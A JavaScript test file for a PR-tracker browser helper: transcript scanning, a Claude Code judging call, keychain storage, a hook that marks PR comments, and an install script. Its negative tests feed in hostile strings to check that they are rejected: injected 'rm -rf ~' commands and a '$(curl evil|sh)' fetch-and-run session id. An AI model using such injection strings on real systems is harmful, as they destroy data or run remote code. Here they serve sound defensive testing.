import assert from 'node:assert/strict'
import { execFileSync, spawn } from 'node:child_process'
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { describe, it } from 'node:test'
import { fileURLToPath } from 'node:url'

import { hookOutput, markCommand } from '../native/claude-code-hook.mjs'
import { accountPolicy, handle, judge, judgeArgs, secret } from '../native/host.mjs'
import { indexTranscript, sessionsFor } from '../native/scan.mjs'
import { claudeCodeMark, resumeCommand } from '../lib/sessions.js'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const ID = '57609ddd-15b6-4739-a098-97387dc48b05'
/** One transcript line, JSON-encoded the way Claude Code writes them. */
const line = (/** @type {object} */ o) => JSON.stringify(o)

describe('transcript scan', () => {
  it('finds PR links and gh commands, and tells reviews from mentions', () => {
    const text = [
      line({ type: 'user', cwd: '/Users/me/Repository/product-feed', timestamp: '2026-08-03T06:50:47Z', message: { content: 'look at https://github.com/gdncomm/product-feed/pull/99 for context' } }),
      line({ type: 'user', timestamp: '2026-08-03T07:00:00Z', message: { content: '/code-review review this PR https://github.com/gdncomm/Product-Feed/pull/104' } }),
      line({ type: 'assistant', timestamp: '2026-08-03T07:10:00Z', message: { content: [{ type: 'tool_use', input: { command: 'gh pr comment 78 --repo gdncomm/traffic-tracker-aggregator --body "x"' } }] } }),
      line({ type: 'assistant', timestamp: '2026-08-03T07:11:00Z', message: { content: [{ type: 'tool_use', input: { command: 'gh pr view --repo gdncomm/seo 12' } }] } }),
      line({ type: 'custom-title', customTitle: 'Review partner salt change', sessionId: ID }),
    ].join('\n')
    const index = indexTranscript(text)
    assert.deepEqual(index.prs, {
      'gdncomm/product-feed#99': 'mention',
      'gdncomm/product-feed#104': 'review',
      'gdncomm/traffic-tracker-aggregator#78': 'review',
      'gdncomm/seo#12': 'mention',
    })
    assert.equal(index.cwd, '/Users/me/Repository/product-feed')
    assert.equal(index.title, 'Review partner salt change')
    assert.equal(index.lastAt, '2026-08-03T07:11:00Z')
  })

  it('lists reviews before mentions, newest first, capped', () => {
    const entry = (/** @type {string} */ at, /** @type {'review' | 'mention'} */ kind) => ({ mtimeMs: 0, size: 0, prs: { 'o/r#1': kind }, cwd: '/p', title: at, lastAt: at })
    const index = { '/x/a.jsonl': entry('2026-01-03', 'mention'), '/x/b.jsonl': entry('2026-01-01', 'review'), '/x/c.jsonl': entry('2026-01-02', 'review') }
    assert.deepEqual(sessionsFor(index, ['O/R#1'])['o/r#1'].map((s) => s.sessionId), ['c', 'b', 'a'])
  })

  it('answers over the helper protocol, skipping its own repo, caching by mtime', async () => {
    const home = mkdtempSync(path.join(tmpdir(), 'pr-tracker-host-'))
    try {
      const projects = path.join(home, 'projects')
      mkdirSync(path.join(projects, 'p1'), { recursive: true })
      mkdirSync(path.join(projects, 'self'), { recursive: true })
      writeFileSync(path.join(projects, 'p1', `${ID}.jsonl`), line({ cwd: '/work/api', timestamp: '2026-01-01T00:00:00Z', text: 'gh pr review 5 --repo o/api --approve' }))
      writeFileSync(path.join(projects, 'self', 'dev.jsonl'), line({ cwd: ROOT, text: 'https://github.com/o/api/pull/5' }))
      const cache = path.join(home, 'cache.json')
      const answer = handle({ type: 'sessions', prs: ['o/api#5'] }, projects, cache)
      assert.deepEqual(answer, { ok: true, sessions: { 'o/api#5': [{ sessionId: ID, cwd: '/work/api', title: '', lastAt: '2026-01-01T00:00:00Z', kind: 'review' }] } })
      assert.ok(JSON.parse(readFileSync(cache, 'utf8'))[path.join(projects, 'p1', `${ID}.jsonl`)])
      assert.equal(statSync(cache).mode & 0o777, 0o600, 'the cache is private to this user')
      assert.equal((await /** @type {any} */ (handle({ type: 'ping' }, projects, cache))).version, 4)
      assert.equal(/** @type {any} */ (handle({ type: 'nope' }, projects, cache)).ok, false)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('speaks Chrome framing over stdio', async () => {
    const child = spawn(process.execPath, [path.join(ROOT, 'native/host.mjs')], { env: { ...process.env, CLAUDE_CONFIG_DIR: path.join(tmpdir(), 'pr-tracker-none') } })
    const body = Buffer.from(JSON.stringify({ type: 'ping' }))
    const head = Buffer.alloc(4)
    head.writeUInt32LE(body.length)
    child.stdin.write(Buffer.concat([head, body]))
    const out = await new Promise((resolve) => child.stdout.once('data', resolve))
    child.kill()
    const buf = /** @type {Buffer} */ (out)
    assert.equal(JSON.parse(buf.subarray(4, 4 + buf.readUInt32LE(0)).toString()).version, 4)
  })
})

describe('judge via Claude Code', () => {
  const request = { type: 'judge', model: 'claude-sonnet-5', system: 'S', schema: { type: 'object' }, prompt: 'the PR' }
  const TEAM = JSON.stringify({ loggedIn: true, authMethod: 'claude.ai', apiProvider: 'firstParty', subscriptionType: 'team', orgName: 'acme' })
  /** A stand-in claude CLI: answers `auth status` with `auth`; otherwise records its args and stdin, prints what the test says. @param {string} dir @param {string} print */
  const fakeClaude = (dir, print, auth = TEAM) => {
    const bin = path.join(dir, 'claude')
    writeFileSync(bin, `#!/bin/sh\nif [ "$1" = auth ]; then printf '%s' '${auth}'; exit 0; fi\nprintf '%s\\n' "$@" > "${dir}/args"\ncat > "${dir}/stdin"\nprintf '%s' '${print}'\n`)
    execFileSync('chmod', ['+x', bin])
    return bin
  }

  it('runs claude -p with every tool, setting and MCP server off, and returns the structured output', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'pr-tracker-judge-'))
    try {
      const bin = fakeClaude(dir, JSON.stringify({ subtype: 'success', is_error: false, structured_output: { summary: 's', verdicts: [] } }))
      assert.deepEqual(await judge(request, bin), { ok: true, output: { summary: 's', verdicts: [] } })
      const args = readFileSync(path.join(dir, 'args'), 'utf8').split('\n').slice(0, -1)
      assert.deepEqual(args, judgeArgs(request))
      assert.equal(args[args.indexOf('--tools') + 1], '', 'no tools at all')
      assert.ok(args.includes('--no-session-persistence') && args.includes('--strict-mcp-config'))
      assert.equal(readFileSync(path.join(dir, 'stdin'), 'utf8'), 'the PR')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('refuses a personal plan before sending anything', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'pr-tracker-judge-'))
    try {
      const pro = JSON.stringify({ loggedIn: true, authMethod: 'claude.ai', apiProvider: 'firstParty', subscriptionType: 'pro' })
      const bin = fakeClaude(dir, JSON.stringify({ subtype: 'success', is_error: false, structured_output: { summary: 's', verdicts: [] } }), pro)
      const r = /** @type {any} */ (await judge(request, bin))
      assert.equal(r.ok, false)
      assert.match(r.error, /signed in with a personal Pro plan.*only sends PR content to Claude under a company Team or Enterprise plan/)
      assert.throws(() => readFileSync(path.join(dir, 'stdin')), 'claude -p never ran, so the PR never left')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('account policy: company plans and company clouds only', () => {
    const base = { loggedIn: true, authMethod: 'claude.ai', apiProvider: 'firstParty' }
    assert.deepEqual(accountPolicy({ ...base, subscriptionType: 'team', orgName: 'gdncomm-team08' }), { ok: true, label: 'Team plan · gdncomm-team08' })
    assert.equal(accountPolicy({ ...base, subscriptionType: 'enterprise' }).ok, true)
    assert.equal(accountPolicy({ loggedIn: true, apiProvider: 'bedrock' }).ok, true)
    for (const plan of ['pro', 'max', 'free']) assert.equal(accountPolicy({ ...base, subscriptionType: plan }).ok, false, plan)
    assert.equal(accountPolicy({ ...base }).ok, false, 'no plan reported')
    assert.equal(accountPolicy({ loggedIn: true, authMethod: 'api_key', apiProvider: 'firstParty' }).ok, false, "a key we can't place")
    assert.equal(accountPolicy({ loggedIn: false }).ok, false)
    assert.equal(accountPolicy(null).ok, false)
  })

  it('passes on Claude Code errors (not logged in) and refuses odd requests', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'pr-tracker-judge-'))
    try {
      const bin = fakeClaude(dir, JSON.stringify({ subtype: 'success', is_error: true, result: 'Not logged in · Please run /login' }))
      assert.deepEqual(await judge(request, bin), { ok: false, error: 'Not logged in · Please run /login' })
      assert.equal((await judge({ ...request, model: 'x; rm -rf ~' }, bin)).ok, false)
      assert.match(/** @type {any} */ (await judge(request, null)).error, /claude command wasn't found/)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('Keychain secrets', () => {
  it('stores, reads and deletes a token in the real macOS Keychain (a throwaway service)', { skip: process.platform !== 'darwin' }, async () => {
    process.env.PR_TRACKER_KEYCHAIN_SERVICE = `com.gdncomm.pr-tracker.test-${process.pid}`
    try {
      assert.deepEqual(await secret({ type: 'secret-get', name: 'github' }), { ok: true, value: '' }, 'nothing yet')
      assert.deepEqual(await secret({ type: 'secret-set', name: 'github', value: 'github_pat_11ABC_def-123' }), { ok: true })
      assert.deepEqual(await secret({ type: 'secret-get', name: 'github' }), { ok: true, value: 'github_pat_11ABC_def-123' })
      assert.deepEqual(await secret({ type: 'secret-set', name: 'github', value: 'github_pat_replaced' }), { ok: true }, 'updates in place')
      assert.deepEqual(await secret({ type: 'secret-get', name: 'github' }), { ok: true, value: 'github_pat_replaced' })
      assert.deepEqual(await secret({ type: 'secret-delete', name: 'github' }), { ok: true })
      assert.deepEqual(await secret({ type: 'secret-get', name: 'github' }), { ok: true, value: '' })
    } finally {
      await secret({ type: 'secret-delete', name: 'github' })
      delete process.env.PR_TRACKER_KEYCHAIN_SERVICE
    }
  })

  it('refuses unknown names and values that would need quoting', async () => {
    assert.equal((await secret({ type: 'secret-get', name: 'aws' })).ok, false)
    assert.equal((await secret({ type: 'secret-set', name: 'github', value: 'x" ; rm -rf ~ ; "' })).ok, false)
    assert.equal((await secret({ type: 'secret-set', name: 'github', value: '' })).ok, false)
  })
})

describe('Claude Code hook', () => {
  const mark = `<!-- claude-code-session: ${ID} -->`
  it('marks a quoted --body', () => {
    assert.equal(markCommand('gh pr comment 78 --repo o/r --body "Looks good"', ID), `gh pr comment 78 --repo o/r --body "Looks good\n\n${mark}"`)
    assert.equal(markCommand("gh pr review 5 --approve -b 'ok'", ID), `gh pr review 5 --approve -b 'ok\n\n${mark}'`)
  })

  it('marks the heredoc form Claude Code writes', () => {
    const cmd = `gh pr review 5 --comment --body "$(cat <<'EOF'\n## Review\n- fine\nEOF\n)"`
    assert.equal(markCommand(cmd, ID), `gh pr review 5 --comment --body "$(cat <<'EOF'\n## Review\n- fine\n\n${mark}\nEOF\n)"`)
  })

  it('leaves everything else alone', () => {
    assert.equal(markCommand('gh pr view 5', ID), null)
    assert.equal(markCommand('gh pr comment 5 --body-file notes.md', ID), null)
    assert.equal(markCommand(`gh pr comment 5 --body "x ${mark}"`, ID), null, 'already marked')
  })

  it('rewrites input only — never approves or blocks', () => {
    const out = hookOutput({ session_id: ID, tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"', timeout: 5 } })
    assert.deepEqual(Object.keys(out?.hookSpecificOutput ?? {}).sort(), ['hookEventName', 'updatedInput'])
    assert.equal(out?.hookSpecificOutput.updatedInput.timeout, 5)
    const mcp = hookOutput({ session_id: ID, tool_name: 'mcp__github__add_issue_comment', tool_input: { body: 'hi', issue_number: 1 } })
    assert.equal(mcp?.hookSpecificOutput.updatedInput.body, `hi\n\n${mark}`)
    assert.equal(hookOutput({ session_id: ID, tool_name: 'Read', tool_input: { file_path: 'x' } }), null)
    assert.equal(hookOutput({ tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"' } }), null, 'no session id')
    assert.equal(hookOutput({ session_id: '$(curl evil|sh)', tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"' } }), null, 'only a UUID goes into a command')
  })

  it('works as a real hook: JSON in on stdin, JSON out', () => {
    const input = JSON.stringify({ session_id: ID, tool_name: 'Bash', tool_input: { command: 'gh pr comment 1 --body "hi"' } })
    const out = JSON.parse(execFileSync(process.execPath, [path.join(ROOT, 'native/claude-code-hook.mjs')], { input }).toString())
    assert.equal(out.hookSpecificOutput.updatedInput.command, `gh pr comment 1 --body "hi\n\n${mark}"`)
    assert.equal(execFileSync(process.execPath, [path.join(ROOT, 'native/claude-code-hook.mjs')], { input: 'not json' }).toString(), '', 'bad input: silent, exit 0')
  })

  it('the marker is read back from a comment', () => {
    assert.deepEqual(claudeCodeMark(`LGTM\n\n${mark}`), { sessionId: ID, viaClaudeCode: true })
    assert.deepEqual(claudeCodeMark('🤖 Generated with [Claude Code](https://claude.com/claude-code)'), { sessionId: undefined, viaClaudeCode: true })
    assert.deepEqual(claudeCodeMark('plain'), { sessionId: undefined, viaClaudeCode: false })
    assert.equal(resumeCommand(ID, "/Users/me/it's"), `cd '/Users/me/it'\\''s' && claude --resume ${ID}`)
    assert.equal(resumeCommand(ID), `claude --resume ${ID}`)
  })
})

describe('install.sh', () => {
  it('writes the host manifest and adds/removes only its own hook', () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'pr-tracker-install-'))
    const env = { ...process.env, PR_TRACKER_HOSTS_DIR: path.join(dir, 'hosts'), CLAUDE_SETTINGS: path.join(dir, 'settings.json') }
    const extId = 'abcdefghijklmnopabcdefghijklmnop'
    // Run a copy: install.sh writes and --uninstall deletes native/host-run.sh next to
    // itself, and a real install from this folder must survive the test suite.
    const native = path.join(dir, 'native')
    cpSync(path.join(ROOT, 'native'), native, { recursive: true, filter: (src) => !src.endsWith('host-run.sh') })
    const install = path.join(native, 'install.sh')
    const before = existsSync(path.join(ROOT, 'native/host-run.sh')) ? readFileSync(path.join(ROOT, 'native/host-run.sh'), 'utf8') : null
    try {
      writeFileSync(env.CLAUDE_SETTINGS, JSON.stringify({ model: 'x', hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'mine.sh' }] }] } }))
      execFileSync('sh', [install, extId, '--hook'], { env, stdio: 'pipe' })
      execFileSync('sh', [install, extId, '--hook'], { env, stdio: 'pipe' }) // twice: still one hook
      const host = JSON.parse(readFileSync(path.join(env.PR_TRACKER_HOSTS_DIR, 'com.gdncomm.pr_tracker.json'), 'utf8'))
      assert.deepEqual(host.allowed_origins, [`chrome-extension://${extId}/`])
      assert.equal(host.path, path.join(native, 'host-run.sh'))
      const settings = JSON.parse(readFileSync(env.CLAUDE_SETTINGS, 'utf8'))
      assert.equal(settings.model, 'x')
      const commands = settings.hooks.PreToolUse.flatMap((/** @type {any} */ g) => g.hooks.map((/** @type {any} */ h) => h.command))
      assert.equal(commands.filter((/** @type {string} */ c) => c.includes('claude-code-hook.mjs')).length, 1)
      assert.ok(commands.includes('mine.sh'), "the user's own hook stays")

      execFileSync('sh', [install, '--uninstall'], { env, stdio: 'pipe' })
      const after = JSON.parse(readFileSync(env.CLAUDE_SETTINGS, 'utf8'))
      assert.deepEqual(after, { model: 'x', hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'mine.sh' }] }] } })
      assert.throws(() => execFileSync('sh', [install, 'bad-id'], { env, stdio: 'pipe' }))
      const now = existsSync(path.join(ROOT, 'native/host-run.sh')) ? readFileSync(path.join(ROOT, 'native/host-run.sh'), 'utf8') : null
      assert.equal(now, before, "the real install's launcher is untouched")
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})
